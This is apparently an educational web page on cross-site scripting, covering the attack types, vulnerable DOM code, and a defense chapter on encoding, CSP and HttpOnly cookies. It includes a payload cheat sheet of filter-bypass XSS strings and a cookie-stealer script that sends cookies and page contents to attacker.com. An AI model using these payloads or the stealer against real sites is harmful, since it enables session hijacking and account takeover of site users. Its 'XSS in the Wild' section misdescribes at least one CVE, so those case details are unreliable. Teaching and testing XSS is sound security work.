Cross-Site Scripting

What if you could run your JavaScript in someone else's browser?
Not hypothetically. Literally. Right now.

"The user clicked a link. Your code ran in their browser. Game over."

CVE examples · 3 attack types · Live playground · Cookie stealer demo

Chapter 01 // The Big Idea

💉 What is XSS?

Imagine a guestbook on a website. You can leave a comment. Now imagine instead of your name, you leave a JavaScript script. And the website just… runs it. For every visitor. That's XSS.

The core idea 🧠

Websites trust user input more than they should. When a site takes your input and puts it back in the HTML page without sanitizing it, your input becomes code. JavaScript code. Running in the victim's browser.


What can you do with arbitrary JavaScript in someone's browser?
→ Steal their session cookie → log in as them
→ Capture keystrokes → get their passwords
→ Redirect them to a phishing page
→ Make requests on their behalf (CSRF via XSS)
→ Take screenshots via HTML5 canvas
→ Mine cryptocurrency in their browser

The 3 types you need to know

Most Common

🪃 Reflected XSS

Your payload is in the URL. Server reflects it back in the page. Victim clicks your crafted link. Runs once — only in their browser.

Example: Search results that echo the search query back.

Most Dangerous

💾 Stored XSS

Your payload is saved in the database. Runs for EVERY user who views the page. A single submission can compromise thousands of accounts.

Example: A comment, profile name, or forum post.

Sneakiest

🌐 DOM-Based XSS

Payload never hits the server. JavaScript reads from the URL hash or other DOM source and writes it directly to the page. Hardest to detect.

Example: Client-side JS that reads location.hash.

Chapter 04 // DOM-Based XSS

🌐 DOM-Based XSS — Server Never Sees It

Client-side JavaScript reads data from the URL (like the hash fragment) and writes it to the DOM without sanitizing. The server is completely clean. WAFs miss it. Scanners miss it.

🌐 DOM XSS Demo — Hash-Based

Vulnerable JavaScript code on the page:

// Vulnerable: reads hash, writes to DOM with innerHTML const name = location.hash.slice(1); // everything after # document.getElementById('greeting').innerHTML = `Hello, ${name}!`; // If hash is: #<img src=x onerror=alert(1)> // innerHTML parses it as HTML → XSS fires

Simulate the hash:

https://example.com/welcome#
Hello, Alice!
normal name HTML inject XSS payload
💡 Why WAFs miss this: The hash fragment (#payload) is never sent to the server — the browser strips it. So a Web Application Firewall inspecting server-side traffic sees nothing. The payload only exists client-side.

Common DOM XSS sources (where data comes from)

location.href ← full URL location.hash ← fragment after # location.search ← query string (?param=value) document.referrer ← where you came from document.cookie ← cookies (readable by JS) window.name ← survives navigation localStorage / sessionStorage postMessage() ← cross-origin messages

Common DOM XSS sinks (where data goes — dangerous)

innerHTML = payload ← parses HTML → XSS outerHTML = payload document.write(payload) document.writeln(payload) eval(payload) ← executes as JS directly setTimeout(payload, 0) setInterval(payload, 0) location = payload ← can be javascript: URL location.href = payload element.src = payload

Chapter 05 // Payload Arsenal

⚔️ XSS Payload Cheat Sheet

Different contexts need different payloads. A payload that works in a search field might not work in an HTML attribute. Know your context.

Basic — Start with these

// Classic (blocked most places now, but always try first) <script>alert(1)</script> // When script tags are blocked — event handlers <img src=x onerror=alert(1)> <svg onload=alert(1)> <body onload=alert(1)> <input autofocus onfocus=alert(1)> <details open ontoggle=alert(1)></details> // When inside HTML attribute: value="PAYLOAD" " onmouseover="alert(1) " autofocus onfocus="alert(1)

Context: Inside JavaScript

// Page has: var name = "USER_INPUT"; // Inject to break out of the string: "; alert(1); // '-alert(1)-' `${alert(1)}`

Filter Bypass — When the obvious is blocked

// Case mixing <ScRiPt>alert(1)</ScRiPt> // No parentheses needed (works in some contexts) <img src=x onerror="alert`1`"> // HTML entities (decoded by browser) <img src=x onerror=&#97;lert(1)> // Unicode encoding <img src=x onerror=\u0061lert(1)> // Double URL encoding (sometimes) %253Cscript%253Ealert(1)%253C/script%253E // SVG with CDATA <svg><script><![CDATA[alert(1)]]></script></svg>

Real Impact — Cookie Stealer

// This is what makes XSS dangerous in the real world // Attacker hosts a collector at https://attacker.com/collect <script> new Image().src = 'https://attacker.com/collect?c=' + encodeURIComponent(document.cookie); </script> // Fetch-based (bypasses some CSP restrictions): <script> fetch('https://attacker.com/collect', { method:'POST', body: JSON.stringify({ cookie: document.cookie, url: location.href, dom: document.body.innerHTML.substring(0,1000) }) }); </script>
🚨 Cookie stealing in bug bounties: To demonstrate real impact, you don't need to actually steal anyone's cookies. Show the PoC fires with alert(document.cookie) or alert(document.domain) — that proves it's exploitable. Report the full cookie-stealer technique in your write-up as theoretical impact.

Chapter 06 // Defense

🛡️ How to actually prevent XSS

✅ Output Encoding (The Real Fix)

Convert special characters to HTML entities before rendering. < becomes &lt;. Browser displays it as text, not code.

// PHP htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); // Python/Jinja2 {{ variable | e }} // auto in Jinja2 // JavaScript element.textContent = input; // NOT innerHTML

✅ Content Security Policy (CSP)

HTTP header that tells the browser what scripts are allowed to run. Properly configured CSP prevents XSS execution even if injection succeeds.

# HTTP Response Header: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-RANDOM'; object-src 'none';

✅ HttpOnly Cookie Flag

Makes session cookies inaccessible to JavaScript. Even if XSS fires, the attacker can't steal the session cookie via document.cookie.

Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict;

✅ Input Validation

Allowlist valid characters. If a name field only needs letters, reject everything else. Don't rely on this alone — combine with output encoding.

// Allowlist approach: /^[a-zA-Z0-9 ]{1,50}$/.test(input) // ⚠️ NEVER denylist — always bypassable // input.replace('<script>', '') ← WRONG

Chapter 07 // Real World

🌍 XSS in the Wild

💀 CVE-2023-41179 — Trend Micro Stored XSS
CVSS: 9.1 Critical. A stored XSS in Trend Micro Apex One and Worry-Free Business Security. Attackers could execute arbitrary code in the admin console. Affected tens of thousands of enterprise deployments.
💀 CVE-2024-23917 — JetBrains TeamCity XSS
Reflected XSS in TeamCity CI/CD server. Allowed an unauthenticated attacker to steal admin session cookies via a crafted URL. Critical for software supply chain security.
💀 Bug Bounty: $12,000 XSS (Meta, 2022)
A stored XSS on Facebook's internal preview tool. By posting a crafted message, a researcher could execute JS in any Facebook employee's browser. Patched within days, rewarded $12,000.
💀 Bug Bounty: $14,000 DOM XSS (Google, 2021)
DOM-based XSS in Google Drive. The URL hash parameter was written directly to innerHTML. Allowed stealing Google OAuth tokens of any user who clicked the link.
